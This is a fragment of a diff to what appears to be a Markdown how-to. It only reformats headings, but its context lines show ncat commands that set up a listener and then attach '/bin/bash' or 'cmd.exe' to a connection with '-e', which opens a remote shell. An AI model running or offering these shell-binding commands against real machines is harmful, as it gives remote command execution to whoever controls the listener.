@@ -9,11 +9,11 @@ Run `ncat -lvnp <port>`
 
 
 ### 3) Connect client to server:
-For Linux/Bash:
+**On Linux/Bash:**
 
 Run `ncat <server-internal-ip> <port> -e /bin/bash`
 
-For Windows:
+**On Windows:**
 
 Run `ncat <server-internal-ip> <port> -e cmd.exe`
 
